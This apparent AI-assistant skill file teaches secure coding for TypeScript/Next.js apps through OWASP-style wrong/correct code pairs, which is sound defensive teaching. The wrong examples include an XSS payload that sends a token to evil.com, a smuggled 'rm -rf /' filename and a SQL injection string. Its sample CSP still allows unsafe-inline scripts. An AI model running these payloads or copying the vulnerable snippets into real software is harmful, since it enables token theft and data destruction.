---
name: security-patterns
description: Security best practices for authentication, input validation, OWASP patterns, and secure coding. Use when handling user input, auth, secrets, or sensitive data.
---

# Security Patterns

Comprehensive security patterns and best practices for secure application development.

## When to Use

- Implementing authentication or authorization
- Handling user input or file uploads
- Working with secrets or environment variables
- Creating API endpoints
- Storing or transmitting sensitive data
- Integrating third-party services

## OWASP Top 10 Patterns

### 1. Broken Access Control

#### ❌ WRONG: Missing Authorization
```typescript
export async function DELETE(request: Request) {
  const { userId } = await request.json()

  // No authorization check - anyone can delete any user
  await db.users.delete({ where: { id: userId } })

  return NextResponse.json({ success: true })
}
```

#### ✅ CORRECT: Proper Authorization
```typescript
export async function DELETE(request: Request) {
  const session = await getSession(request)
  const { userId } = await request.json()

  // Check if user is authorized
  if (session.userId !== userId && session.role !== 'admin') {
    return NextResponse.json(
      { error: 'Unauthorized' },
      { status: 403 }
    )
  }

  await db.users.delete({ where: { id: userId } })
  return NextResponse.json({ success: true })
}
```

### 2. Cryptographic Failures

#### ❌ WRONG: Hardcoded Secrets
```typescript
const JWT_SECRET = "my-super-secret-key"
const API_KEY = "sk-proj-xxxxxxxxxxxxx"
const DATABASE_URL = "postgresql://user:password@localhost/db"
```

#### ✅ CORRECT: Environment Variables
```typescript
// .env.local (never commit this file)
JWT_SECRET=use-a-strong-randomly-generated-secret
OPENAI_API_KEY=sk-proj-xxxxxxxxxxxxx
DATABASE_URL=postgresql://user:password@host/db

// app code
const jwtSecret = process.env.JWT_SECRET
if (!jwtSecret) {
  throw new Error('JWT_SECRET environment variable not set')
}

const apiKey = process.env.OPENAI_API_KEY
if (!apiKey) {
  throw new Error('OPENAI_API_KEY not configured')
}
```

**Verification Steps:**
- [ ] No secrets in source code
- [ ] `.env.local` in `.gitignore`
- [ ] Secrets validated at startup
- [ ] Production secrets in hosting platform (Vercel, Railway)
- [ ] No secrets in git history (`git log --all --full-history --source -- .env*`)

### 3. Injection Attacks

#### SQL Injection

❌ **WRONG: String Concatenation**
```typescript
const email = request.body.email
const query = `SELECT * FROM users WHERE email = '${email}'`
await db.query(query)
// Vulnerable to: ' OR '1'='1
```

✅ **CORRECT: Parameterized Queries**
```typescript
// With Supabase
const { data, error } = await supabase
  .from('users')
  .select('*')
  .eq('email', email)

// With raw SQL
await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
)
```

#### Command Injection

❌ **WRONG: Unsanitized Shell Commands**
```typescript
import { exec } from 'child_process'

const filename = request.body.filename
exec(`cat ${filename}`, callback)
// Vulnerable to: file.txt; rm -rf /
```

✅ **CORRECT: Avoid Shell Commands**
```typescript
import { readFile } from 'fs/promises'
import path from 'path'

const filename = request.body.filename
const safePath = path.join('/safe/directory', path.basename(filename))
const content = await readFile(safePath, 'utf8')
```

### 4. Insecure Design

#### ❌ WRONG: Weak Password Requirements
```typescript
function validatePassword(password: string) {
  return password.length >= 6
}
```

#### ✅ CORRECT: Strong Password Policy
```typescript
import { z } from 'zod'

const PasswordSchema = z.string()
  .min(12, 'Password must be at least 12 characters')
  .regex(/[A-Z]/, 'Must contain uppercase letter')
  .regex(/[a-z]/, 'Must contain lowercase letter')
  .regex(/[0-9]/, 'Must contain number')
  .regex(/[^A-Za-z0-9]/, 'Must contain special character')

function validatePassword(password: string) {
  try {
    PasswordSchema.parse(password)
    return { valid: true }
  } catch (error) {
    return { valid: false, errors: error.errors }
  }
}
```

## Input Validation Patterns

### Schema-Based Validation

```typescript
import { z } from 'zod'

// Define schemas for all inputs
const CreateUserSchema = z.object({
  email: z.string().email(),
  name: z.string().min(1).max(100),
  age: z.number().int().min(0).max(150).optional(),
  role: z.enum(['user', 'admin', 'moderator']),
  metadata: z.record(z.string()).optional()
})

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const validated = CreateUserSchema.parse(body)

    // Safe to use validated data
    const user = await db.users.create(validated)
    return NextResponse.json({ success: true, user })

  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        { error: 'Validation failed', details: error.errors },
        { status: 400 }
      )
    }
    throw error
  }
}
```

### File Upload Validation

```typescript
const MAX_FILE_SIZE = 5 * 1024 * 1024 // 5MB
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp']
const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.webp']

function validateFileUpload(file: File): { valid: boolean; error?: string } {
  // Size check
  if (file.size > MAX_FILE_SIZE) {
    return { valid: false, error: 'File too large (max 5MB)' }
  }

  // MIME type check
  if (!ALLOWED_TYPES.includes(file.type)) {
    return { valid: false, error: 'Invalid file type' }
  }

  // Extension check (prevent bypass via MIME type)
  const extension = file.name.toLowerCase().match(/\.[^.]+$/)?.[0]
  if (!extension || !ALLOWED_EXTENSIONS.includes(extension)) {
    return { valid: false, error: 'Invalid file extension' }
  }

  return { valid: true }
}
```

### Sanitize HTML Input

```typescript
import DOMPurify from 'isomorphic-dompurify'

function sanitizeUserHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: [],
    ALLOW_DATA_ATTR: false
  })
}

// Use in component
function UserContent({ html }: { html: string }) {
  const clean = sanitizeUserHTML(html)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

## Authentication Patterns

### JWT Token Handling

❌ **WRONG: localStorage (XSS vulnerable)**
```typescript
// Client-side
localStorage.setItem('token', token)

// Attacker can steal via XSS:
// <script>fetch('evil.com?token='+localStorage.token)</script>
```

✅ **CORRECT: httpOnly Cookies**
```typescript
// Server-side
export async function POST(request: Request) {
  const { email, password } = await request.json()
  const user = await authenticateUser(email, password)

  if (!user) {
    return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 })
  }

  const token = await generateJWT(user)

  const response = NextResponse.json({ success: true })
  response.cookies.set('token', token, {
    httpOnly: true,      // Cannot be accessed by JavaScript
    secure: true,        // Only sent over HTTPS
    sameSite: 'strict',  // CSRF protection
    maxAge: 60 * 60 * 24 // 24 hours
  })

  return response
}
```

### Password Hashing

❌ **WRONG: Plain Text or Weak Hashing**
```typescript
import crypto from 'crypto'

// Never store plain text
const user = { email, password: password }

// MD5/SHA1 are too fast (vulnerable to brute force)
const hash = crypto.createHash('md5').update(password).digest('hex')
```

✅ **CORRECT: bcrypt or Argon2**
```typescript
import bcrypt from 'bcryptjs'

// Hash password with salt
async function hashPassword(password: string): Promise<string> {
  const saltRounds = 12 // Increase for more security
  return await bcrypt.hash(password, saltRounds)
}

// Verify password
async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return await bcrypt.compare(password, hash)
}

// Usage
const hashedPassword = await hashPassword(plainPassword)
await db.users.create({ email, password: hashedPassword })
```

### Multi-Factor Authentication

```typescript
import speakeasy from 'speakeasy'
import QRCode from 'qrcode'

// Generate MFA secret
async function setupMFA(userId: string, email: string) {
  const secret = speakeasy.generateSecret({
    name: `MyApp (${email})`,
    length: 32
  })

  // Save secret to database
  await db.users.update({
    where: { id: userId },
    data: { mfaSecret: secret.base32 }
  })

  // Generate QR code for authenticator app
  const qrCode = await QRCode.toDataURL(secret.otpauth_url!)

  return { secret: secret.base32, qrCode }
}

// Verify MFA token
function verifyMFAToken(token: string, secret: string): boolean {
  return speakeasy.totp.verify({
    secret,
    encoding: 'base32',
    token,
    window: 2 // Allow 2 time steps before/after
  })
}
```

## Authorization Patterns

### Role-Based Access Control (RBAC)

```typescript
type Role = 'user' | 'moderator' | 'admin'

const PERMISSIONS = {
  user: ['read:own', 'write:own'],
  moderator: ['read:all', 'write:all', 'delete:flagged'],
  admin: ['read:all', 'write:all', 'delete:all', 'manage:users']
} as const

function hasPermission(role: Role, permission: string): boolean {
  return PERMISSIONS[role].includes(permission)
}

// Middleware
async function requirePermission(permission: string) {
  return async (request: Request) => {
    const session = await getSession(request)

    if (!session || !hasPermission(session.role, permission)) {
      return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
    }

    return null // Continue
  }
}

// Usage
export async function DELETE(request: Request) {
  const authError = await requirePermission('delete:all')(request)
  if (authError) return authError

  // Proceed with deletion
}
```

### Row Level Security (Supabase)

```sql
-- Enable RLS on tables
ALTER TABLE posts ENABLE ROW LEVEL SECURITY;

-- Users can only read their own posts
CREATE POLICY "Users read own posts"
  ON posts FOR SELECT
  USING (auth.uid() = user_id);

-- Users can only insert their own posts
CREATE POLICY "Users insert own posts"
  ON posts FOR INSERT
  WITH CHECK (auth.uid() = user_id);

-- Users can only update their own posts
CREATE POLICY "Users update own posts"
  ON posts FOR UPDATE
  USING (auth.uid() = user_id);

-- Users can only delete their own posts
CREATE POLICY "Users delete own posts"
  ON posts FOR DELETE
  USING (auth.uid() = user_id);

-- Admins can do anything
CREATE POLICY "Admins full access"
  ON posts FOR ALL
  USING (
    EXISTS (
      SELECT 1 FROM users
      WHERE users.id = auth.uid()
      AND users.role = 'admin'
    )
  );
```

## Rate Limiting

```typescript
import rateLimit from 'express-rate-limit'

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                 // 100 requests per window
  message: 'Too many requests, please try again later',
  standardHeaders: true,
  legacyHeaders: false
})

// Strict rate limit for expensive operations
const searchLimiter = rateLimit({
  windowMs: 60 * 1000,      // 1 minute
  max: 10,                  // 10 requests per minute
  message: 'Too many search requests'
})

// Auth rate limit (prevent brute force)
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,                   // 5 failed attempts
  skipSuccessfulRequests: true
})

app.use('/api/', apiLimiter)
app.use('/api/search', searchLimiter)
app.use('/api/auth/login', authLimiter)
```

## Security Headers

```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload'
  },
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin'
  },
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-eval' 'unsafe-inline';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self';
      connect-src 'self' https://api.example.com;
      frame-ancestors 'none';
    `.replace(/\s{2,}/g, ' ').trim()
  }
]

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders
      }
    ]
  }
}
```

## Logging Best Practices

### ❌ WRONG: Logging Sensitive Data
```typescript
console.log('Login attempt:', { email, password })
console.log('Payment processed:', { cardNumber, cvv, amount })
console.log('Error:', error) // May contain tokens in stack trace
```

### ✅ CORRECT: Redact Sensitive Data
```typescript
function sanitizeForLogging(data: any): any {
  const sensitive = ['password', 'token', 'secret', 'apiKey', 'cvv', 'ssn']
  const sanitized = { ...data }

  for (const key of sensitive) {
    if (key in sanitized) {
      sanitized[key] = '[REDACTED]'
    }
  }

  return sanitized
}

console.log('Login attempt:', sanitizeForLogging({ email, password }))
console.log('Payment processed:', { userId, amount, last4: card.last4 })
console.error('Error:', { message: error.message, userId, endpoint })
```

## Pre-Deployment Security Checklist

- [ ] **Secrets**: No hardcoded secrets, all in environment variables
- [ ] **Input Validation**: All user inputs validated with schemas
- [ ] **SQL Injection**: All queries use parameterized queries or ORM
- [ ] **XSS Prevention**: User HTML sanitized, CSP headers configured
- [ ] **CSRF Protection**: SameSite cookies, CSRF tokens on mutations
- [ ] **Authentication**: Tokens in httpOnly cookies, passwords hashed with bcrypt
- [ ] **Authorization**: Role checks on all protected routes
- [ ] **Rate Limiting**: Enabled on all public endpoints
- [ ] **HTTPS**: Enforced in production (HSTS headers)
- [ ] **Security Headers**: All headers configured (CSP, X-Frame-Options, etc.)
- [ ] **Error Handling**: Generic error messages, no stack traces to users
- [ ] **Logging**: No sensitive data logged (passwords, tokens, PII)
- [ ] **Dependencies**: Up to date, no known vulnerabilities (npm audit)
- [ ] **File Uploads**: Validated (size, type, extension)
- [ ] **CORS**: Properly configured, not `*` in production

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/configuring/security-headers)
- [npm audit](https://docs.npmjs.com/cli/v9/commands/npm-audit)
